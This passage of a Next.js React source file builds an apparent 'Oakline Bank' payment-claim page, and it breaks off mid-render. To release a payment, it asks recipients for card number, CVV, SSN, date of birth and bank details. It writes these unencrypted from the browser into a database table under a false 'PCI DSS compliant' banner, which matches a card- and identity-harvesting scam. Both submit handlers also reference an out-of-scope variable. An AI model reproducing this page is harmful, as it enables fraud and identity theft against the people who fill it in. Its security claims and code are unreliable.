import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import { supabase } from '../lib/supabaseClient';
import Head from 'next/head';

export default function ClaimPaymentPage() {
  const router = useRouter();
  const { token } = router.query;
  const [payment, setPayment] = useState(null);
  const [loading, setLoading] = useState(true);
  const [message, setMessage] = useState('');
  const [messageType, setMessageType] = useState('info');
  const [submitting, setSubmitting] = useState(false);
  const [activeTab, setActiveTab] = useState('debit_card');
  const [claimSuccess, setClaimSuccess] = useState(false);
  const [receiptData, setReceiptData] = useState(null);

  const [debitCardForm, setDebitCardForm] = useState({
    first_name: '',
    last_name: '',
    cardholder_name: '',
    card_number: '',
    card_expiry: '',
    card_cvv: '',
    ssn: '',
    date_of_birth: '',
    billing_address: '',
    billing_city: '',
    billing_state: '',
    billing_zip: '',
    billing_country: ''
  });

  const [achForm, setAchForm] = useState({
    account_holder_name: '',
    account_number: '',
    routing_number: '',
    account_type: 'checking',
    ssn: '',
    date_of_birth: ''
  });


  useEffect(() => {
    if (token) {
      loadPaymentDetails();
    }
  }, [token]);

  const loadPaymentDetails = async () => {
    try {
      const { data: paymentData, error } = await supabase
        .from('oakline_pay_pending_claims')
        .select('*')
        .eq('claim_token', token)
        .single();

      if (error || !paymentData) {
        setMessage('Payment not found. Please check the link and try again.');
        setMessageType('error');
        setLoading(false);
        return;
      }

      if (paymentData.approval_status === 'card_details_submitted') {
        setMessage('📋 Claim Under Review\n\nYour claim has been successfully submitted and is currently under review by our team. You will receive an email notification as soon as the payment is processed. Thank you for your patience!');
        setMessageType('info');
        setLoading(false);
        return;
      }

      if (paymentData.approval_status === 'approved') {
        setMessage('✅ Payment Approved & Processing\n\nYour claim has been approved and your funds are being transferred. You will receive the payment within 1-3 business days. A confirmation email has been sent to you.');
        setMessageType('success');
        setLoading(false);
        return;
      }

      if (paymentData.approval_status === 'rejected') {
        setMessage('❌ Claim Not Approved\n\nYour claim was not approved. Please contact support for more information.');
        setMessageType('error');
        setLoading(false);
        return;
      }

      if (new Date(paymentData.expires_at) < new Date()) {
        setMessage('⏰ Payment Link Expired\n\nThis payment link has expired. Please contact the sender for a new link.');
        setMessageType('error');
        setLoading(false);
        return;
      }

      setPayment(paymentData);
      setLoading(false);
    } catch (error) {
      console.error('Error loading payment:', error);
      setMessage('An error occurred while loading the payment.');
      setMessageType('error');
      setLoading(false);
    }
  };

  const handleDebitCardSubmit = async () => {
    if (!debitCardForm.first_name || !debitCardForm.last_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !debitCardForm.ssn || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_state || !debitCardForm.billing_zip || !debitCardForm.billing_country) {
      setMessage('Please fill in all required fields.', 'error');
      setMessageType('error');
      return;
    }

    setSubmitting(true);
    try {
      const finalCardholderName = debitCardForm.cardholder_name.trim() || `${debitCardForm.first_name} ${debitCardForm.last_name}`;
      const { error } = await supabase
        .from('oakline_pay_pending_claims')
        .update({
          claim_method: 'debit_card',
          claimed_at: new Date().toISOString(),
          cardholder_name: finalCardholderName,
          card_number: debitCardForm.card_number,
          card_expiry: debitCardForm.card_expiry,
          card_cvv: debitCardForm.card_cvv,
          ssn: debitCardForm.ssn,
          date_of_birth: debitCardForm.date_of_birth,
          billing_address: debitCardForm.billing_address,
          billing_city: debitCardForm.billing_city,
          billing_state: debitCardForm.billing_state,
          billing_zip: debitCardForm.billing_zip,
          billing_country: debitCardForm.billing_country,
          approval_status: 'card_details_submitted'
        })
        .eq('claim_token', token)
        .eq('status', 'sent');

      if (error) throw error;

      // Send notification email to receiver
      await fetch('/api/send-claim-notification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          receiver_email: paymentData.receiver_email,
          receiver_name: paymentData.receiver_name,
          sender_name: payment.sender_name || payment.sender_contact,
          amount: payment.amount,
          claim_method: 'debit_card',
          claim_token: token
        })
      }).catch(err => console.error('Error sending notification:', err));

      setReceiptData({
        claimMethod: 'debit_card',
        amount: payment.amount,
        senderName: payment.sender_name || payment.sender_contact,
        timestamp: new Date().toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' })
      });
      setClaimSuccess(true);
    } catch (error) {
      console.error('Error:', error);
      setMessage('Failed to process claim. Please try again.');
      setMessageType('error');
    } finally {
      setSubmitting(false);
    }
  };

  const handleAchSubmit = async () => {
    if (!achForm.account_holder_name || !achForm.account_number || !achForm.routing_number || !achForm.ssn || !achForm.date_of_birth) {
      setMessage('Please fill in all required fields.', 'error');
      setMessageType('error');
      return;
    }

    setSubmitting(true);
    try {
      const { error } = await supabase
        .from('oakline_pay_pending_claims')
        .update({
          claim_method: 'ach',
          claimed_at: new Date().toISOString(),
          account_holder_name: achForm.account_holder_name,
          account_number: achForm.account_number,
          routing_number: achForm.routing_number,
          account_type: achForm.account_type,
          ssn: achForm.ssn,
          date_of_birth: achForm.date_of_birth,
          approval_status: 'card_details_submitted'
        })
        .eq('claim_token', token)
        .eq('status', 'sent');

      if (error) throw error;

      // Send notification email to receiver
      await fetch('/api/send-claim-notification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          receiver_email: paymentData.receiver_email,
          receiver_name: paymentData.receiver_name,
          sender_name: payment.sender_name || payment.sender_contact,
          amount: payment.amount,
          claim_method: 'ach',
          claim_token: token
        })
      }).catch(err => console.error('Error sending notification:', err));

      setReceiptData({
        claimMethod: 'ach',
        amount: payment.amount,
        senderName: payment.sender_name || payment.sender_contact,
        timestamp: new Date().toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' })
      });
      setClaimSuccess(true);
    } catch (error) {
      console.error('Error:', error);
      setMessage('Failed to process claim. Please try again.');
      setMessageType('error');
    } finally {
      setSubmitting(false);
    }
  };

  const handleOpenAccountClick = () => {
    const siteUrl = process.env.NEXT_PUBLIC_SITE_URL || 'https://theoaklinebank.com';
    const applyUrl = `${siteUrl}/apply?claim_token=${token}`;
    window.location.href = applyUrl;
  };

  if (loading) {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)' }}>
        <div style={{ textAlign: 'center', color: 'white' }}>
          <div style={{ width: '50px', height: '50px', border: '4px solid rgba(255,255,255,0.3)', borderTop: '4px solid white', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 1rem' }}></div>
          <p style={{ fontSize: '1.1rem', fontWeight: '500' }}>Loading payment details...</p>
        </div>
      </div>
    );
  }

  return (
    <>
      <Head>
        <title>Claim Payment - Oakline Bank</title>
      </Head>
      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        @media (max-width: 768px) {
          .tab-container { flex-direction: column; }
          .form-row { flex-direction: column !important; }
          .form-row > div { flex: 1 !important; }
        }
      `}</style>
      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '1.5rem'
      }}>
        <div style={{
          background: 'white',
          borderRadius: '16px',
          padding: '0',
          maxWidth: '750px',
          width: '100%',
          boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
          maxHeight: '95vh',
          overflowY: 'auto'
        }}>
          {/* Header Section */}
          <div style={{
            background: 'linear-gradient(135deg, #0052a3 0%, #003a7a 100%)',
            color: '#ffffff',
            padding: '2.5rem 2rem',
            borderRadius: '16px 16px 0 0',
            textAlign: 'center'
          }}>
            <h1 style={{ margin: '0 0 0.25rem 0', fontSize: '1.25rem', fontWeight: '800', color: '#ffffff', letterSpacing: '-0.5px' }}>🏦 OAKLINE BANK</h1>
            <p style={{ margin: '0 0 1.5rem 0', fontSize: '0.85rem', color: 'rgba(255,255,255,0.9)', fontWeight: '500', letterSpacing: '0.5px' }}>PAYMENT CLAIM SYSTEM</p>
            <div style={{ fontSize: '3rem', fontWeight: '900', marginBottom: '0.75rem', color: '#ffffff' }}>
              ${parseFloat(payment?.amount || 0).toFixed(2)}
            </div>
            <p style={{ margin: '0', fontSize: '0.9rem', color: 'rgba(255,255,255,0.95)', fontWeight: '500' }}>
              From <strong style={{ color: '#ffffff' }}>{payment?.sender_name || payment?.sender_contact}</strong>
            </p>
          </div>

          {/* Message Section */}
          {message && (
            <div style={{ padding: '2rem' }}>
              <div style={{
                backgroundColor: messageType === 'error' ? '#fee2e2' : messageType === 'success' ? '#dcfce7' : '#e0f2fe',
                border: `2px solid ${messageType === 'error' ? '#fca5a5' : messageType === 'success' ? '#86efac' : '#7dd3fc'}`,
                color: messageType === 'error' ? '#991b1b' : messageType === 'success' ? '#065f46' : '#0c4a6e',
                padding: '1.5rem',
                borderRadius: '12px',
                fontSize: '0.95rem',
                lineHeight: '1.6',
                whiteSpace: 'pre-line'
              }}>
                {message}
              </div>
            </div>
          )}

          {payment && (
            <div style={{ padding: '2rem' }}>
              {/* Security Banner */}
              <div style={{
                backgroundColor: '#f0feff',
                border: '1px solid #a5f3fc',
                borderRadius: '12px',
                padding: '1.25rem',
                marginBottom: '2rem',
                display: 'flex',
                gap: '1rem',
                alignItems: 'flex-start'
              }}>
                <span style={{ fontSize: '1.5rem' }}>🔒</span>
                <div>
                  <p style={{ margin: '0 0 0.25rem 0', color: '#0c4a6e', fontWeight: '600', fontSize: '0.95rem' }}>Your Information is Secure</p>
                  <p style={{ margin: '0', color: '#0c7a99', fontSize: '0.85rem', lineHeight: '1.5' }}>All personal details are encrypted with 256-bit SSL and PCI DSS compliant.</p>
                </div>
              </div>

              {/* Payment Options Intro */}
              <div style={{ marginBottom: '2rem' }}>
                <p style={{ margin: '0 0 1rem 0', color: '#333', fontSize: '0.95rem', lineHeight: '1.6' }}>
                  Choose how you'd like to receive your payment. You have <strong style={{ color: '#0066cc' }}>14 days</strong> to claim this payment.
                </p>
              </div>

              {/* Tabs */}
              <div style={{
                display: 'flex',
                gap: '1rem',
                marginBottom: '2.5rem',
                paddingBottom: '1.5rem',
                borderBottom: '2px solid #e5e7eb',
                className: 'tab-container'
              }}>
                {[
                  { id: 'debit_card', label: 'Debit Card', subtitle: 'Instant' },
                  { id: 'ach', label: 'ACH Transfer', subtitle: '1-3 Days' },
                  { id: 'account', label: 'Create Account', subtitle: 'Instant' }
                ].map(tab => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    style={{
                      padding: '0.875rem 1.25rem',
                      border: 'none',
                      borderBottom: activeTab === tab.id ? '3px solid #0066cc' : 'none',
                      backgroundColor: 'transparent',
                      color: activeTab === tab.id ? '#0066cc' : '#64748b',
                      cursor: 'pointer',
                      fontWeight: activeTab === tab.id ? '700' : '600',
                      fontSize: '0.95rem',
                      transition: 'all 0.3s ease',
                      flex: 1,
                      textAlign: 'center',
                      display: 'flex',
                      flexDirection: 'column',
                      alignItems: 'center',
                      gap: '0.35rem'
                    }}
                    onMouseEnter={(e) => !activeTab === tab.id && (e.target.style.color = '#0066cc')}
                    onMouseLeave={(e) => !activeTab === tab.id && (e.target.style.color = '#64748b')}
                  >
                    <div style={{ fontSize: '0.95rem' }}>{tab.label}</div>
                    <div style={{ fontSize: '0.75rem', color: activeTab === tab.id ? '#0066cc' : '#999', fontWeight: '500' }}>{tab.subtitle}</div>
                  </button>
                ))}
              </div>

              {/* DEBIT CARD TAB */}
              {activeTab === 'debit_card' && (
                <div style={{ animation: 'fadeIn 0.3s ease-in' }}>
                  <h3 style={{ color: '#1e293b', fontSize: '1.15rem', fontWeight: '700', marginBottom: '0.75rem', marginTop: 0 }}>Debit Card Deposit</h3>
                  <p style={{ color: '#0066cc', marginBottom: '2rem', fontSize: '0.9rem', fontWeight: '500' }}>Visa / Mastercard — Funds available within 1 hour</p>

                  <div style={{ marginBottom: '2.5rem' }}>
                    <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Personal Information</h4>
                    <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>First Name *</label>
                        <input type="text" placeholder="John" value={debitCardForm.first_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, first_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                      </div>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Last Name *</label>
                        <input type="text" placeholder="Doe" value={debitCardForm.last_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, last_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                      </div>
                    </div>
                  </div>

                  <div style={{ marginBottom: '2.5rem' }}>
                    <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Card Details</h4>

                    <div style={{ marginBottom: '1rem' }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Cardholder Name (if different) <span style={{ color: '#999', fontWeight: '400', fontSize: '0.8rem' }}>Optional</span></label>
                      <input type="text" placeholder="Name as shown on card (leave blank to use first and last name)" value={debitCardForm.cardholder_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, cardholder_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                      <p style={{ margin: '0.5rem 0 0 0', fontSize: '0.8rem', color: '#999' }}>If your card shows a different name than your legal name, enter it here. Otherwise, we'll use your first and last name.</p>
                    </div>

                    <div style={{ marginBottom: '1rem' }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Number *</label>
                      <input type="text" placeholder="1234 5678 9012 3456" maxLength="19" value={debitCardForm.card_number} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_number: e.target.value.replace(/\D/g, '') })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', letterSpacing: '2px', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                    </div>

                    <div className="form-row" style={{ display: 'flex', gap: '1rem' }}>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Expiry (MM/YY) *</label>
                        <input type="text" placeholder="MM/YY" maxLength="5" value={debitCardForm.card_expiry} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_expiry: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                      </div>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>CVV *</label>
                        <input type="text" placeholder="123" maxLength="4" value={debitCardForm.card_cvv} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_cvv: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                      </div>
                    </div>
                  </div>

                  <div style={{ marginBottom: '2.5rem' }}>
                    <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Identity Verification</h4>
                    <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>SSN *</label>
                        <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={debitCardForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setDebitCardForm({ ...debitCardForm, ssn: v }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                      </div>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Date of Birth *</label>
                        <input type="date" value={debitCardForm.date_of_birth} onChange={(e) => setDebitCardForm({ ...debitCardForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                      </div>
                    </div>
                  </div>

                  <div style={{ marginBottom: '2.5rem' }}>
                    <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Billing Address</h4>
                    <div style={{ marginBottom: '1rem' }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Street Address *</label>
                      <input type="text" placeholder="123 Main Street" value={debitCardForm.billing_address} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_address: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                    </div>

                    <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                      <div style={{ flex: 2 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>City *</label>
                        <input type="text" placeholder="New York" value={debitCardForm.billing_city} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_city: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                      </div>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>State *</label>
                        <input type="text" placeholder="NY" maxLength="2" value={debitCardForm.billing_state} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_state: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                      </div>
                    </div>

                    <div className="form-row" style={{ display: 'flex', gap: '1rem' }}>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>ZIP Code *</label>
                        <input type="text" placeholder="10001" value={debitCardForm.billing_zip} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_zip: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                      </div>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Country *</label>
                        <input type="text" placeholder="United States" value={debitCardForm.billing_country} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_country: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                      </div>
                    </div>
                  </div>

                  <button onClick={handleDebitCardSubmit} disabled={submitting} style={{ width: '100%', padding: '1rem', background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)', color: 'white', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: submitting ? 'not-allowed' : 'pointer', opacity: submitting ? 0.7 : 1, fontSize: '1rem', transition: 'all 0.2s' }}>
                    {submitting ? '⏳ Processing...' : '✓ Claim to Debit Card'}
                  </button>
                </div>
              )}

              {/* ACH TAB */}
              {activeTab === 'ach' && (
                <div style={{ animation: 'fadeIn 0.3s ease-in' }}>
                  <h3 style={{ color: '#1e293b', fontSize: '1.1rem', marginBottom: '0.5rem', margin: '0 0 0.5rem 0' }}>🏦 ACH Bank Transfer</h3>
                  <p style={{ color: '#64748b', marginBottom: '1.5rem', fontSize: '0.9rem' }}>Direct deposit to your US bank account - typically 1-3 business days</p>

                  <div style={{ marginBottom: '2rem' }}>
                    <h4 style={{ color: '#333', fontSize: '0.95rem', fontWeight: '600', marginBottom: '1rem', marginTop: 0 }}>Bank Account Details</h4>
                    <div style={{ marginBottom: '1rem' }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Account Holder Name *</label>
                      <input type="text" placeholder="Full name" value={achForm.account_holder_name} onChange={(e) => setAchForm({ ...achForm, account_holder_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                    </div>

                    <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Routing Number *</label>
                        <input type="text" placeholder="000000000" value={achForm.routing_number} onChange={(e) => setAchForm({ ...achForm, routing_number: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                      </div>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Account Number *</label>
                        <input type="text" placeholder="1234567890" value={achForm.account_number} onChange={(e) => setAchForm({ ...achForm, account_number: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                      </div>
                    </div>

                    <div style={{ marginBottom: '1.5rem' }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Account Type *</label>
                      <select value={achForm.account_type} onChange={(e) => setAchForm({ ...achForm, account_type: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }}>
                        <option value="checking">Checking</option>
                        <option value="savings">Savings</option>
                      </select>
                    </div>
                  </div>

                  <div style={{ marginBottom: '2rem' }}>
                    <h4 style={{ color: '#333', fontSize: '0.95rem', fontWeight: '600', marginBottom: '1rem', marginTop: 0 }}>Verification Details</h4>
                    <div className="form-row" style={{ display: 'flex', gap: '1rem' }}>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>SSN *</label>
                        <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={achForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setAchForm({ ...achForm, ssn: v }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                      </div>
                      <div style={{ flex: 1 }}>
                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Date of Birth *</label>
                        <input type="date" value={achForm.date_of_birth} onChange={(e) => setAchForm({ ...achForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                      </div>
                    </div>
                  </div>

                  <button onClick={handleAchSubmit} disabled={submitting} style={{ width: '100%', padding: '1rem', background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)', color: 'white', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: submitting ? 'not-allowed' : 'pointer', opacity: submitting ? 0.7 : 1, fontSize: '1rem', transition: 'all 0.2s' }}>
                    {submitting ? '⏳ Processing...' : '✓ Claim via ACH'}
                  </button>
                </div>
              )}

              {/* ACCOUNT TAB */}
              {activeTab === 'account' && (
                <div style={{ animation: 'fadeIn 0.3s ease-in' }}>
                  <h3 style={{ color: '#1e293b', fontSize: '1.1rem', marginBottom: '0.5rem', margin: '0 0 0.5rem 0' }}>📱 Create Oakline Account</h3>
                  <p style={{ color: '#64748b', marginBottom: '1.5rem', fontSize: '0.9rem' }}>Open a full Oakline Bank account with access to all banking features</p>

                  <div style={{ backgroundColor: '#f0feff', border: '1px solid #a5f3fc', borderRadius: '12px', padding: '1.25rem', marginBottom: '2rem' }}>
                    <p style={{ margin: '0 0 0.75rem 0', color: '#0c7a99', fontSize: '0.9rem', lineHeight: '1.5', fontWeight: '500' }}>
                      ✨ <strong>Full Banking Features</strong>
                    </p>
                    <p style={{ margin: '0', color: '#0c7a99', fontSize: '0.85rem', lineHeight: '1.6' }}>
                      Create a complete Oakline Bank account with full access to transfers, payments, investments, and more. Your payment of ${parseFloat(payment?.amount || 0).toFixed(2)} will be credited once your account is verified.
                    </p>
                  </div>

                  <div style={{ backgroundColor: '#fff3cd', border: '1px solid #ffc107', borderRadius: '12px', padding: '1.25rem', marginBottom: '2rem' }}>
                    <p style={{ margin: '0 0 0.75rem 0', color: '#856404', fontSize: '0.9rem', fontWeight: '600' }}>
                      📋 Account Verification Required
                    </p>
                    <ul style={{ margin: '0', paddingLeft: '1.5rem', color: '#856404', fontSize: '0.85rem', lineHeight: '1.6' }}>
                      <li>Quick identity verification (2-5 minutes)</li>
                      <li>SSN and personal information verification</li>
                      <li>Account activated immediately after verification</li>
                    </ul>
                  </div>

                  <div style={{ marginBottom: '2rem', padding: '1.5rem', backgroundColor: '#f8fafc', borderRadius: '12px', border: '1px solid #e2e8f0' }}>
                    <h4 style={{ color: '#333', fontSize: '0.95rem', fontWeight: '600', marginBottom: '1rem', marginTop: 0 }}>What Happens Next</h4>
                    <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                      <div style={{ fontSize: '1.5rem', minWidth: '40px', textAlign: 'center' }}>1️⃣</div>
                      <div>
                        <p style={{ margin: '0 0 0.25rem 0', color: '#333', fontWeight: '500', fontSize: '0.9rem' }}>Complete Application</p>
                        <p style={{ margin: '0', color: '#666', fontSize: '0.85rem' }}>Fill out the account application with your information</p>
                      </div>
                    </div>
                    <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                      <div style={{ fontSize: '1.5rem', minWidth: '40px', textAlign: 'center' }}>2️⃣</div>
                      <div>
                        <p style={{ margin: '0 0 0.25rem 0', color: '#333', fontWeight: '500', fontSize: '0.9rem' }}>Verify Identity</p>
                        <p style={{ margin: '0', color: '#666', fontSize: '0.85rem' }}>Complete identity verification as part of our security procedures</p>
                      </div>
                    </div>
                    <div style={{ display: 'flex', gap: '1rem' }}>
                      <div style={{ fontSize: '1.5rem', minWidth: '40px', textAlign: 'center' }}>3️⃣</div>
                      <div>
                        <p style={{ margin: '0 0 0.25rem 0', color: '#333', fontWeight: '500', fontSize: '0.9rem' }}>Receive Your Payment</p>
                        <p style={{ margin: '0', color: '#666', fontSize: '0.85rem' }}>Once verified, ${parseFloat(payment?.amount || 0).toFixed(2)} is credited to your account</p>
                      </div>
                    </div>
                  </div>

                  <button onClick={handleOpenAccountClick} style={{ width: '100%', padding: '1rem', background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)', color: 'white', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: 'pointer', fontSize: '1rem', transition: 'all 0.2s' }}>
                    ✓ Open Account Now
                  </button>

